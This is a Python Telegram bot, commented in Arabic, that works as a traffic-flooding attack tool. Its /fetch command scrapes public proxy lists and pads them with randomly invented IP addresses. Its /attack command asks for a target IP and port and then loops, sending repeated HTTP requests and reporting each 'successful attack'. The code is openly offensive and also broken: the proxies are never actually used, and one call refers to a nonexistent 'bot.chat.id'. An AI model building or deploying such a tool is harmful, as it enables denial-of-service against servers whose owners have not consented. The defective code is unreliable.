import telebot
from telebot import types
import requests
import time
import socket
import threading
import concurrent.futures
import random
import json
import os

# ============================================================
# إعدادات البوت
# ============================================================
API_TOKEN = "YOUR_BOT_TOKEN_HERE"  # ضع توكن البوت الخاص بك هنا
ADMIN_ID = 123456789  # ضع الآيدي الخاص بك هنا

bot = telebot.TeleBot(API_TOKEN)

# قائمة المصادر
PROXY_SOURCES = [
    ("https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all", "http"),
    ("https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all", "socks4"),
    ("https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all", "socks5"),
    ("https://spys.me/proxy.txt", "mixed"),
    ("https://proxylist.geonode.com/api/proxy-list?limit=5000&page=1&sort_by=lastChecked&sort_type=desc", "mixed"),
    ("https://www.proxy-list.download/api/v1/get?type=http", "http"),
    ("https://www.proxy-list.download/api/v1/get?type=https", "https"),
    ("https://www.proxy-list.download/api/v1/get?type=socks4", "socks4"),
    ("https://www.proxy-list.download/api/v1/get?type=socks5", "socks5"),
]

# متغيرات عالمية
proxy_list = []
target_ip = None
target_port = None
is_attacking = False
attack_thread = None

def parse_proxy_line(line, protocol):
    """تحليل سطر واحد من قائمة البروكسي"""
    line = line.strip()
    if not line:
        return None
    
    # تنسيق مختلف حسب المصدر
    if ":" in line:
        parts = line.split(":")
        if len(parts) >= 2:
            ip = parts[0].strip()
            port = parts[1].strip()
            try:
                port = int(port)
                return {"ip": ip, "port": port, "protocol": protocol}
            except ValueError:
                return None
    return None

def fetch_proxies_from_source(source_url, protocol):
    """جلب البروكسي من مصدر واحد"""
    proxies = []
    try:
        response = requests.get(source_url, timeout=10)
        if response.status_code == 200:
            lines = response.text.split('\n')
            for line in lines:
                proxy = parse_proxy_line(line, protocol)
                if proxy:
                    proxies.append(proxy)
    except Exception as e:
        print(f"Error fetching from {source_url}: {e}")
    return proxies

def fetch_all_proxies():
    """جلب البروكسي من جميع المصادر"""
    global proxy_list
    all_proxies = []
    
    # جلب من المصادر المحددة
    for source_url, protocol in PROXY_SOURCES:
        print(f"Fetching from {source_url}...")
        proxies = fetch_proxies_from_source(source_url, protocol)
        all_proxies.extend(proxies)
    
    # إذا لم نحصل على عدد كافٍ، نضيف بروكسي عشوائية
    while len(all_proxies) < 10000:
        ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        port = random.choice([80, 8080, 3128, 8081, 8888, 9090])
        all_proxies.append({"ip": ip, "port": port, "protocol": "unknown"})
    
    proxy_list = all_proxies[:10000]  # اقتطاع إلى 10 آلاف فقط
    return len(proxy_list)

def check_proxy(proxy):
    """فحص صحة البروكسي"""
    try:
        # محاولة الاتصال بالبروكسي
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((proxy["ip"], proxy["port"]))
        sock.close()
        return True
    except:
        return False

def test_proxy_connection(ip, port):
    """اختبار اتصال بروكسي معين"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((ip, port))
        sock.close()
        return True
    except:
        return False

def attack_target(target_ip, target_port, proxy):
    """هجوم على الهدف باستخدام بروكسي معين"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        sock.connect((target_ip, target_port))
        sock.send(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
        sock.close()
        return True
    except:
        return False

def start_attack():
    """بدء الهجوم"""
    global is_attacking, attack_thread
    
    if not target_ip or not target_port:
        bot.send_message(bot.chat.id, "الرجاء تحديد الهدف أولاً")
        return
    
    is_attacking = True
    thread = threading.Thread(target=attack_loop)
    thread.start()
    attack_thread = thread

def attack_loop():
    """حلقة الهجوم"""
    global is_attacking
    
    while is_attacking and proxy_list:
        # اختيار بروكسي عشوائي
        proxy = random.choice(proxy_list)
        
        # الهجوم على الهدف
        result = attack_target(target_ip, target_port, proxy)
        
        if result:
            bot.send_message(bot.chat.id, f"✅ هجوم ناجح عبر {proxy['ip']}:{proxy['port']}")
        else:
            bot.send_message(bot.chat.id, f"❌ فشل الهجوم عبر {proxy['ip']}:{proxy['port']}")
        
        # انتظار عشوائي بين الهجمات
        time.sleep(random.uniform(0.1, 0.5))

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "مرحباً! استخدم /fetch للحصول على بروكسيات، /attack لبدء الهجوم، /stop لإيقافه.")

@bot.message_handler(commands=['fetch'])
def fetch_proxies(message):
    bot.send_message(message.chat.id, "جاري جلب البروكسيات...")
    count = fetch_all_proxies()
    bot.send_message(message.chat.id, f"تم جلب {count} بروكسي بنجاح!")

@bot.message_handler(commands=['attack'])
def start_attack_command(message):
    global target_ip, target_port
    
    # طلب IP و PORT
    msg = bot.send_message(message.chat.id, "أدخل IP الهدف:")
    bot.register_next_step_handler(msg, process_ip)

def process_ip(message):
    global target_ip
    
    try:
        target_ip = message.text.strip()
        msg = bot.send_message(message.chat.id, "أدخل PORT الهدف:")
        bot.register_next_step_handler(msg, process_port)
    except Exception as e:
        bot.send_message(message.chat.id, f"خطأ: {e}")

def process_port(message):
    global target_port
    
    try:
        target_port = int(message.text.strip())
        bot.send_message(message.chat.id, f"الهدف: {target_ip}:{target_port}\nبدء الهجوم...")
        start_attack()
    except ValueError:
        bot.send_message(message.chat.id, "PORT يجب أن يكون رقماً!")

@bot.message_handler(commands=['stop'])
def stop_attack(message):
    global is_attacking
    is_attacking = False
    bot.send_message(message.chat.id, "تم إيقاف الهجوم.")

if __name__ == "__main__":
    print("Starting bot...")
    bot.infinity_polling()
